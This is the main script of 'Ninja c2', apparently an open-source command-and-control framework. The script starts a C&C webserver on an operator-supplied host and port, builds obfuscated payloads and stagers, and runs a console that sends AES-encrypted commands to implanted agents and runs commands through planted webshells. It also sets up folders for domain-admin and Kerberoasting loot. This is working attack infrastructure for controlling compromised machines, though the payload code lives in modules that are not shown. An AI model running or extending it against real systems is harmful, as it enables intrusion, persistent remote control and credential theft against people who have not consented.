#!/usr/bin/env python3

__program__ = "Ninja c2"
__version__ = "2.0"

import _thread
import threading
from shlex import split
from rich.console import Console

console = Console()

try:
    from core.cmd import *
    from core.payloads import *
    from core import config
except (ImportError, ImportWarning) as e:
    console.print("### Please run: python3 start_campaign.py", style="bold red")
    exit(1)


class Ninja:
    def create_dirs(self, dirs):
        try:
            name = campaign_name + "/" + dirs
            os.makedirs(name)
        except OSError:
            return

    def NinjaCMD(self):
        while True:
            try:
                """Adding tab completion and adding to history file"""
                readline.set_completer(Command_Completer)
                readline.parse_and_bind("tab: complete")
                readline.write_history_file(".history")

                """Displaying Ninja prompt based on what we are interacting with"""
                if config.POINTER == 'main':
                    command = console.input(f'[bold yellow]({config.BASE}:{config.POINTER})>[/ bold yellow] ')
                elif config.POINTER == 'webshell':
                    command = console.input(f'[bold cyan]({config.BASE}:{config.POINTER})> [/bold cyan]')
                elif config.Implant_Type == 'agent':
                    agent = str(config.AGENTS[config.POINTER][0])
                    agent2 = config.AGENTS[config.POINTER][5]
                    command = console.input(f'[bold green]({config.BASE} : Agent({agent})-{agent2})[/bold green]')
                elif config.Implant_Type == 'webshell':
                    webshell1 = str(config.WEBSHELLS[config.POINTER][0])
                    webshell2 = config.WEBSHELLS[config.POINTER][1]
                    command = console.input(f'[bold red]({config.BASE} : webshell({webshell1})@{webshell2})[/bold red]')
                bcommand = split(command)  # split from shlex module

                if bcommand:
                    if bcommand[0] in cmd.COMMANDS:
                        result = getattr(globals()['cmd'](), bcommand[0])(bcommand)
                    elif bcommand[
                        0] not in cmd.COMMANDS and config.POINTER != 'main' and config.POINTER != 'webshell' and config.Implant_Type == 'agent':
                        config.COMMAND[config.POINTER].append(encrypt(AESKey, command.strip()))

                    elif bcommand[
                        0] not in cmd.COMMANDS and config.POINTER != 'main' and config.POINTER != 'webshell' and config.Implant_Type == 'webshell':
                        try:
                            _thread.start_new_thread(webshell.webshell_execute,
                                                     (config.WEBSHELLS[config.POINTER], command.strip(),))

                        except:
                            console.print("[!] Error: unable to start thread", style="bold red")
                            console.print_exception()
            except (EOFError, KeyboardInterrupt):  # Handles Ctrl+C and Ctrl+D (NO exit)
                console.print("\n[!] Type exit", style="bold red")
                continue

    def Make_Payloads(self):  # Not reliable? (May require some more exceptions work)
        try:
            console.print("\n[bold italic cyan][-] Creating Payloads..[/bold italic cyan]")
            """core/config.py"""
            config.PAYLOAD()
            config.obfuscate()
            config.STAGER()
            config.cspayload()
            """core/payloads.py"""
            Create_Payloads()
        except:
            """Remove below line if it's affecting the tool (replace with 'pass')"""
            console.print_exception()

    def main(self):
        """Replace those to a specific directory based on campaign name"""
        self.create_dirs("downloads")
        self.create_dirs("file")
        self.create_dirs("images")
        self.create_dirs("DA")
        self.create_dirs("kerberoast")

        CC = []
        if config.HOST == "" or config.PORT == "":
            while len(CC) == 0:
                CC = console.input('[cyan][-] Enter a DN/IP:port for C&C: IP:Port: [/cyan]')
            CC = CC.split(':')
            config.set_port(CC[1])
            config.set_ip(CC[0])

        """Start webserver"""
        console.print("[-] Starting WebServer..", style="bold italic cyan")
        server = threading.Thread(target=webserver.main, args=())
        server.start()
        time.sleep(0.5)

        """Make payloads"""
        self.Make_Payloads()

        """Reading history file content to use"""
        f = open(".history", "a").write("\n")
        readline.read_history_file(".history")

        """Loading webshell if exist"""
        try:
            console.print("\n[-] Loading registered webshell list", style="bold italic cyan")
            with open('.webshells', 'rb') as f:
                config.WEBSHELLS = pickle.load(f)
        except FileNotFoundError:
            console.print("[!] Webshell list file doesn't exist.\n", style="red")

        """Start Ninja Command line"""
        self.NinjaCMD()

    @staticmethod
    def Banner():
        console.print(f"""[blue]
    ███╗   ██╗██╗███╗   ██╗     ██╗ █████╗      ██████╗██████╗ 
    ████╗  ██║██║████╗  ██║     ██║██╔══██╗    ██╔════╝╚════██╗
    ██╔██╗ ██║██║██╔██╗ ██║     ██║███████║    ██║      █████╔╝
    ██║╚██╗██║██║██║╚██╗██║██   ██║██╔══██║    ██║     ██╔═══╝ 
    ██║ ╚████║██║██║ ╚████║╚█████╔╝██║  ██║    ╚██████╗███████╗
    ╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝ ╚════╝ ╚═╝  ╚═╝     ╚═════╝╚══════╝	
                                                            [/blue][bold cyan]Version: {config.VERSION}[/bold cyan]
[bold yellow][-] Ninja C2 | Stealthy Pwn like a Ninja[/bold yellow]\n\n""")


if __name__ == '__main__':
    try:
        """Create an instance of the class"""
        ninja = Ninja()
        """Display banner"""
        Ninja.Banner()
        """Run Ninja"""
        ninja.main()
    except Exception:
        console.print_exception()

"""
TODO:
        * Handle Ctrl+C and Ctrl+D ===> [Done]
        * Disable verbose output of payloads.. ==> [Done]
        * Add clear screen option in core/cmd.py ===> [Done]
        * Try to implement shlex (Needs more testing before implementing) ===> [Done]
        * Replace pretty tables with rich.tables for a pretty output (Done for help command)
        * Display listeners in a nicer way [with background colors] -> (Pending...)
        * Explore and implement default tool colors --> (Pending...)
        * Make a specific directory for every campaign based on a campaign name (add that option to start_campaign.py)
        * Add traceback and logging mechanism
"""

"""
Help menu to 3 sections
* main
* enum
* dumps

Payloads
"""

"""
[+] Before pull request
delete utils/payloads/ALL-Folders
delete core/config.py
delete campaign/DA....
delete .history
"""
